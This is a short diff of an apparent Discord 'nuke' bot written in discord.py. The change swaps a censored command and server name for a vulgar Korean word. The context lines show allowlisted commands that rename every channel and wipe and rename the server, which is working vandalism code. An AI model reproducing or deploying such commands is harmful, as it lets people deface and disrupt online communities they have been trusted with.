@@ -137,14 +137,14 @@ async def _sorry(ctx):
         for c in ctx.guild.channels:
             await c.edit(name="죄송하다") 
 
-@bot.command(name="X스하다")
+@bot.command(name="섹스하다")
 async def _sexx(ctx):
     with open("I enjoy.json") as json_file:
         json_data = json.load(json_file)
     if str(ctx.author.id) not in json_data:
         await ctx.send("즐겁다")
     else:
-        await ctx.guild.edit(icon=None, name=f"X")
+        await ctx.guild.edit(icon=None, name=f"섹스")
         await ctx.send("터뜨려서 대접하다")
 
 @bot.command(name="대단하다")
